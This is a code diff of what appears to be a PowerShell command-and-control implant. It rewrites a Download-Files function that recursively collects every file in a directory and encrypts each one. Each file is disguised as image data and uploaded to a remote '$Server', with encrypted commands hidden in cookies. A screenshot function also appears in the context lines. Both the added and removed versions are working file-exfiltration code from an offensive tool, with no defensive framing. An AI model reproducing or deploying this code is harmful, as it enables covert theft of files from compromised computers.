@@ -280,6 +280,25 @@ Function Get-Screenshot
     }
     return $b64
 }
+function Download-Files
+{
+    param
+    (
+        [string] $Directory
+    ) 
+    $files = Get-ChildItem $Directory -Recurse | Where-Object{!($_.PSIsContainer)}
+    foreach ($item in $files)
+    {
+        $ReadCommand = "download-file "+$item.FullName
+        $ReadCommand = Encrypt-String $key $ReadCommand
+        $Output = Download-File $item.FullName       
+        $Output = Encrypt-String2 $key $Output
+        $UploadBytes = getimgdata $Output
+        (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
+    } 
+    $ReadCommand = "Files-downloaded"
+    $ReadCommand = Encrypt-String $key $ReadCommand
+}
 function Download-File
 {
     param
@@ -304,31 +323,6 @@ function Download-File
 
     $base64
     $reader.Dispose()
-}
-function Download-Files
-{
-    param
-    (
-        [string] $Directory
-    ) 
-    $files = Get-ChildItem $Directory -File -Recurse
-    $filecount = $files | measure | % { $_.Count }
-    $count = 0
-    echo $filecount
-    foreach ($item in $files)
-    {
-        $count += 1
-        if ($count -eq $filecount){
-            Download-File $item.FullName
-        }else{
-            $ReadCommand = "download-file "+$item.FullName
-            $ReadCommand = Encrypt-String $key $ReadCommand
-            $Output = Download-File $item.FullName       
-            $Output = Encrypt-String2 $key $Output
-            $UploadBytes = getimgdata $Output
-            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
-        }
-    } 
 }
 function Upload-File 
 {
